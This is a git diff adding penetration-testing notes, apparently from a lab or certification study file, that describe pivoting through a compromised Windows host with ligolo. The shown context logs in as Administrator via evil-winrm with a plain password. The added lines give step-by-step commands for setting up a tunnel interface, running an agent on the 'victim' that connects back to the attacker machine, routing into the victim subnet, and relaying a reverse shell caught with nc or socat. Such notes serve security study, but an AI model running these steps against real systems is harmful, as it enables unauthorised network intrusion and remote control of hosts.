@@ -114,3 +114,28 @@ Gives me access via evil-winrm with
 ```
 evil-winrm -i 192.168.227.121 -u Administrator -p password1
 ```
+ligolo instructions
+```
+sudo ip tuntap add user kali mode tun ligolo
+```
+on kali
+```
+ligolo-proxy -selfcert
+```
+on victim
+```
+agent.exe -connect <IP>:<PORT> -ignore-cert
+```
+on kali 
+```
+sudo ip route add <SUBNET>/24 dev ligolo
+```
+in ligolo
+```
+start
+```
+add a listener for reverse connections in kali ligolo type 
+```
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+```
+Use nc or socat on port 10000 to get reverse shell and send over traffic on port 30000 to the proxy on the victim machine and catch it on port 10000 locally
